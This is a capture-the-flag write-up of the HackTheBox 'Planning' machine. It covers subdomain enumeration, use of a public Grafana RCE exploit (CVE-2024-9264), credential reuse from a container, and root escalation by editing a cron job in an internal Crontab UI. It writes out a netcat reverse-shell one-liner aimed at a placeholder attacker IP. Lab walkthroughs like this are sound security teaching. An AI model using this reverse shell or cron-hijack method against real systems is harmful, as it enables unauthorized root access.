## **Hello everyone!**

Welcome to another CTF. Today, we will explore the “Planning” machine released by HackTheBox. Without further ado, let’s get started!

![image](/HTB/Planning/Planning_images/1.png)

(add the following line `TARGET_IP     planning.htb` to your /etc/hosts local file.)

We can see that credentials are provided to us:

admin : 0D5oT70Fq13EvB5r

We will keep them for later use.

## Information Gathering

First, we can use **Nmap** to perform an aggressive scan to obtain comprehensive results:

![image](/HTB/Planning/Planning_images/2.png)

The scan revealed two running services:

**SSH** (OpenSSH 9.6p1 | 22)

**HTTP** (nginx 1.24.0 | 80)

We can start the enumeration phase by inspecting the website running on port 80:

![image](/HTB/Planning/Planning_images/3.png)

The website displays a learning platform. We can use **Gobuster** to enumerate potential hidden directories:

![image](/HTB/Planning/Planning_images/4.png)

As we can see there are common `.php` endpoints related to the “Edukate” template that are used for educational purposes, such as getting enrolled into courses for example.

Since we didn’t find anything interesting, we can perform subdomain enumeration via **ffuf**, a tool very similar but much faster.

![image](/HTB/Planning/Planning_images/5.png)

And we successfully identified an existing subdomain: **grafana**

Grafana is an **open-source analytics and visualization platform** that allows users to query, visualize, and alert on metrics, logs, and traces from various data sources through customizable dashboards.

We need to add it to our `/etc/hosts` file in order to resolve the hostname locally and access it via the web browser:

![image](/HTB/Planning/Planning_images/6.png)

The subdomain is now accessible:

![image](/HTB/Planning/Planning_images/7.png)

As expected, Grafana is running on the target system. The running version is identified as 11.0.0

## Initial Access

If we remember, we have valid credentials for the **admin** user. Let’s use it to log in and access the dashboard:

![image](/HTB/Planning/Planning_images/8.png)

We are now authenticated!

Researching exploits related to the Grafana version led us to an [authenticated RCE exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit), referred to as the **CVE-2024-9264**. We can use it since we have legitimate credentials.

We can download the Python script from the repository and execute it with the -h switch to get more information about its usage:

![image](/HTB/Planning/Planning_images/9.png)

This suggests that we need to provide the target URL, valid username and password, our IP and the listening port. We need to set up a **netcat listener** via `nc -lvnp <PORT>` in order to receive the connection initiated by the script before executing it:

![image](/HTB/Planning/Planning_images/10.png)

We successfully obtained initial access! At first glance, it seems that we already have full access to the system. But if we list the `/root` directory, we cannot retrieve the root flag. There is a chance we are inside a **Docker container**.

After basic enumeration, we can find an interesting environment variable when we use `env`:

![image](/HTB/Planning/Planning_images/11.png)

A cleartext password is stored into our environment variables! It seems to belong to the **enzo** user. We can try logging in via SSH using these credentials:

`enzo : RioTecRANDEntANT!`

![image](/HTB/Planning/Planning_images/12.png)

It works! We can now list our current directory and retrieve the user flag:

![image](/HTB/Planning/Planning_images/13.png)

Next, we check whether we can run some command with elevated privileges via `sudo -l`

![image](/HTB/Planning/Planning_images/14.png)

But it seems that we can’t. 

After enumerating the local system we can find an interesting `crontab.db` file located in the `/opt/crontab` directory:

![image](/HTB/Planning/Planning_images/15.png)

It seems that the application runs cron jobs to perform backup & cleanup of the web files. We can identify a cleartext password: `P4ssw0rdS0pRi0T3c` that could be useful for later.

By using `ss`, we can identify that there is a website which is running locally on the machine:

![image](/HTB/Planning/Planning_images/16.png)

We can port forward the service locally in order to access it via our machine. To do this, we need to initiate a new SSH session with the following command:

`ssh -L 1234:127.0.0.1:8000 enzo@planning.htb`

Here, port `1234` is the port I chose to assign the web server a forwarded port. From there, after providing enzo’s password, we should be able to access the web server:

![image](/HTB/Planning/Planning_images/17.png)

It works! We are prompted to enter some credentials through a HTTP Basic form.

We can safely assume that the password we found in the crontab.db file. After trying a couple of combinations, the following credentials are successful:

`root : P4ssw0rdS0pRi0T3c`

![image](/HTB/Planning/Planning_images/18.png)

We now have access to the Cronjobs dashboard! It seems to be used to configure the cron jobs we found earlier in the `crontab.db` file. We can see that the cleanup task is scheduled to be executed every minute. Moreover, we can edit it! Since we logged in as **root**, we can assume that the scheduled tasks are executed with root privileges, which means that if we modify it in order to make the task to execute a script we can edit (for example in the `/home/enzo` directory), we could obtain a privileged Bash shell.

We can get back to our initial SSH session and create a **bash script** with the following content: 

`#!/bin/bash`

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP NC_PORT >/tmp/f`

![image](/HTB/Planning/Planning_images/19.png)

give it the execute permissions by running `chmod +x FILE`.

We created in the `/home/enzo` directory a bash script which, when executed, initiates a connection to the specified IP and listening port in order to spawn a Bash shell. If the user **enzo** executes it, we will obtain access as him. However, if we can force the script to be executed by **root** (for example via a cron job), we will receive a Bash shell as **root**, granting us full access over the target.

We will now get back to the internal website.

Let’s click the *Edit* button and edit the “Cleanup” scheduled task in order to modify the script path execution to the script we just created.

![image](/HTB/Planning/Planning_images/20.png)

We can then click “Save”.

We need to set up a **netcat listener** to ****receive back the connection from the script we wrote, on the specified port (for my case, it’s 4445)

If everything has been configured correctly, we just have to wait from a few seconds to a minute and a Bash shell running as **root** should spawn:

(If the crontab doesn’t run automatically, you can press “Run Now” via the Crontab UI website to execute manually the task)

![image](/HTB/Planning/Planning_images/21.png)

And we successfully escalated our privileges to **root**!

We can now navigate in the `/root` directory and retrieve the root flag:

![image](/HTB/Planning/Planning_images/22.ong.png)

![image](/HTB/Planning/Planning_images/23.png)

## Conclusion

This machine was a very interesting challenge that combined several realistic attack vectors often encountered during internal assessments and penetration tests. We started with classic reconnaissance and enumeration techniques, which led us to discover a hidden Grafana instance vulnerable to the authenticated RCE **CVE-2024-9264**. Thanks to the provided credentials, we were able to gain initial access inside a Docker container and pivot to the host by recovering reused credentials stored in environment variables.

Privilege escalation required deeper local enumeration and understanding of the system’s architecture. By identifying an exposed internal Cronjobs management interface alongside weak credential management practices, we were able to abuse a scheduled task running as root to execute our own payload and obtain a privileged shell.

Overall, “Planning” highlights several common security issues:

- exposed administrative services,
- vulnerable third-party software,
- credential reuse,
- insecure secret storage,
- and dangerous task automation running with elevated privileges.

**Thank you for reading!**
